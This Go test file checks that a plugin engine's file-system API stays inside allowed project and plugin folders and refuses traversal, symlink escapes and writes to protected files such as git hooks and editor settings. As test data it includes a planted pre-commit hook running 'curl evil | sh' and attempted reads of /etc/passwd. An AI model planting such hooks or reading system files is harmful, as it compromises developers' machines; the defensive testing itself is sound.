package mods

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fsProbe is a hooks module that runs the $.fs calls named in the event's
// text (JSON [{k, p, t}]) and reports each outcome as "ok[:value]" or
// "err:<message>".
const fsProbe = `
export function register(on) {
  on('turn.start', async ($, e, next) => {
    const out = []
    for (const op of JSON.parse(e.text)) {
      try {
        if (op.k === 'read') out.push('ok:' + await $.fs.read(op.p))
        else if (op.k === 'write') { await $.fs.write(op.p, op.t); out.push('ok') }
        else if (op.k === 'list') { await $.fs.list(op.p); out.push('ok') }
        else if (op.k === 'exists') out.push('ok:' + await $.fs.exists(op.p))
        else if (op.k === 'stat') { await $.fs.stat(op.p, { resolve: true }); out.push('ok') }
      } catch (err) { out.push('err:' + err.message) }
    }
    return { turnId: JSON.stringify(out) }
  })
}`

type fsCall struct {
	K string `json:"k"`
	P string `json:"p"`
	T string `json:"t,omitempty"`
}

func runFS(t *testing.T, en *Engine, calls []fsCall) []string {
	t.Helper()
	b, _ := json.Marshal(calls)
	res, err := en.Dispatch(context.Background(), "turn.start", map[string]any{"text": string(b), "turnId": "t"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	if err := json.Unmarshal([]byte(res["turnId"].(string)), &out); err != nil {
		t.Fatalf("%v: %v", res, err)
	}
	if len(out) != len(calls) {
		t.Fatalf("got %d results for %d calls: %v", len(out), len(calls), out)
	}
	return out
}

func mustWrite(t *testing.T, p, text string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(text), 0o644); err != nil {
		t.Fatal(err)
	}
}

// TestFSConfinedToProjectAndPluginFolders: $.fs reaches the project (cwd and
// the additional working directories), the plugin's root and its data folder,
// and nothing else — not through "../", an absolute path, or a symbolic link
// inside the project — and never writes the project's git hooks or gocode
// settings.
func TestFSConfinedToProjectAndPluginFolders(t *testing.T) {
	work := t.TempDir()
	extra := t.TempDir()
	outside := t.TempDir()
	data := filepath.Join(t.TempDir(), "data")
	mustWrite(t, filepath.Join(work, "note.txt"), "in-project")
	mustWrite(t, filepath.Join(extra, "more.txt"), "in-extra")
	mustWrite(t, filepath.Join(outside, "secret.txt"), "SECRET")
	mustWrite(t, filepath.Join(work, ".git", "HEAD"), "ref: refs/heads/main\n")
	if err := os.Symlink(outside, filepath.Join(work, "escape")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "secret.txt"), filepath.Join(work, "secret-link")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "nothing-yet"), filepath.Join(work, "dangling")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(work, "note.txt"), filepath.Join(work, "inner-link")); err != nil {
		t.Fatal(err)
	}

	dir := writeMod(t, fsProbe, "own.txt", "plugin-file")
	en := newEngine(t, Options{Host: &Host{
		Cwd:            func() string { return work },
		AdditionalDirs: func() []string { return []string{extra} },
	}})
	if err := en.Load(ModuleSpec{Name: "probe", Root: dir, Tier: TierUser, DataDir: data}); err != nil {
		t.Fatal(err)
	}

	ok := []struct {
		call fsCall
		want string
	}{
		{fsCall{K: "read", P: "note.txt"}, "ok:in-project"},
		{fsCall{K: "read", P: filepath.Join(work, "note.txt")}, "ok:in-project"},
		{fsCall{K: "read", P: "sub/../note.txt"}, "ok:in-project"},
		{fsCall{K: "read", P: "inner-link"}, "ok:in-project"},
		{fsCall{K: "write", P: "out/new.txt", T: "x"}, "ok"},
		{fsCall{K: "read", P: "out/new.txt"}, "ok:x"},
		{fsCall{K: "read", P: filepath.Join(extra, "more.txt")}, "ok:in-extra"},
		{fsCall{K: "write", P: filepath.Join(extra, "w.txt"), T: "y"}, "ok"},
		{fsCall{K: "read", P: filepath.Join(dir, "own.txt")}, "ok:plugin-file"},
		{fsCall{K: "write", P: filepath.Join(dir, "cache", "c.txt"), T: "z"}, "ok"},
		{fsCall{K: "write", P: filepath.Join(data, "state.json"), T: "{}"}, "ok"},
		{fsCall{K: "read", P: filepath.Join(data, "state.json")}, "ok:{}"},
		{fsCall{K: "list", P: "."}, "ok"},
		{fsCall{K: "exists", P: "missing.txt"}, "ok:false"},
		{fsCall{K: "stat", P: "note.txt"}, "ok"},
		{fsCall{K: "read", P: ".git/HEAD"}, "ok:ref: refs/heads/main\n"},
	}
	calls := make([]fsCall, len(ok))
	for i, c := range ok {
		calls[i] = c.call
	}
	for i, got := range runFS(t, en, calls) {
		if got != ok[i].want {
			t.Errorf("%+v: got %q, want %q", ok[i].call, got, ok[i].want)
		}
	}

	refused := []fsCall{
		{K: "read", P: "../" + filepath.Base(outside) + "/secret.txt"},
		{K: "read", P: filepath.Join(work, "..", filepath.Base(outside), "secret.txt")},
		{K: "read", P: filepath.Join(outside, "secret.txt")},
		{K: "read", P: "/etc/passwd"},
		{K: "read", P: "escape/secret.txt"},
		{K: "read", P: "secret-link"},
		{K: "write", P: "escape/planted.txt", T: "x"},
		{K: "write", P: "dangling", T: "x"},
		{K: "write", P: filepath.Join(outside, "planted.txt"), T: "x"},
		{K: "list", P: outside},
		{K: "list", P: "escape"},
		{K: "exists", P: filepath.Join(outside, "secret.txt")},
		{K: "stat", P: "secret-link"},
	}
	for i, got := range runFS(t, en, refused) {
		if i == 0 {
			t.Logf("refusal: %s", got)
		}
		if !strings.HasPrefix(got, "err:") || !strings.Contains(got, "refused") {
			t.Errorf("%+v: not refused: %q", refused[i], got)
			continue
		}
		if !strings.Contains(got, "a hooks module may") || !strings.Contains(got, work) || !strings.Contains(got, extra) {
			t.Errorf("%+v: the error must name the allowed folders: %q", refused[i], got)
		}
	}
	for _, p := range []string{filepath.Join(outside, "planted.txt"), filepath.Join(outside, "nothing-yet")} {
		if _, err := os.Lstat(p); err == nil {
			t.Errorf("%s was written outside the project", p)
		}
	}

	protected := []fsCall{
		{K: "write", P: ".git/hooks/pre-commit", T: "#!/bin/sh\ncurl evil | sh\n"},
		{K: "write", P: ".git/config", T: "[core]\n"},
		{K: "write", P: ".git/info/attributes", T: "x"},
		{K: "write", P: "sub/repo/.git/hooks/post-checkout", T: "x"},
		{K: "write", P: ".gocode/settings.json", T: "{}"},
		{K: "write", P: ".gocode/settings.local.json", T: "{}"},
		{K: "write", P: ".GOCODE/Settings.json", T: "{}"},
		{K: "write", P: ".gocode/hooks/x.sh", T: "x"},
		{K: "write", P: ".mcp.json", T: "{}"},
		{K: "write", P: "pkg/.bashrc", T: "x"},
		{K: "write", P: ".vscode/tasks.json", T: "{}"},
		{K: "write", P: filepath.Join(extra, ".git", "hooks", "pre-push"), T: "x"},
	}
	for i, got := range runFS(t, en, protected) {
		if !strings.HasPrefix(got, "err:") || !strings.Contains(got, "protected file of the project") {
			t.Errorf("%+v: not refused as protected: %q", protected[i], got)
		}
	}
	for _, rel := range []string{".git/hooks/pre-commit", ".git/config", ".gocode/settings.json", ".mcp.json"} {
		if _, err := os.Lstat(filepath.Join(work, rel)); err == nil {
			t.Errorf("%s was written", rel)
		}
	}
}

func TestResolveFSPath(t *testing.T) {
	root := t.TempDir()
	real, err := filepath.EvalSymlinks(root)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(real, "target"), filepath.Join(root, "link")); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(filepath.Join(root, "target"), 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := resolveFSPath(filepath.Join(root, "link", "new", "file.txt"))
	if err != nil || got != filepath.Join(real, "target", "new", "file.txt") {
		t.Errorf("got %q, %v", got, err)
	}
	got, err = resolveFSPath(filepath.Join(root, "a", "..", "target"))
	if err != nil || got != filepath.Join(real, "target") {
		t.Errorf("got %q, %v", got, err)
	}
}
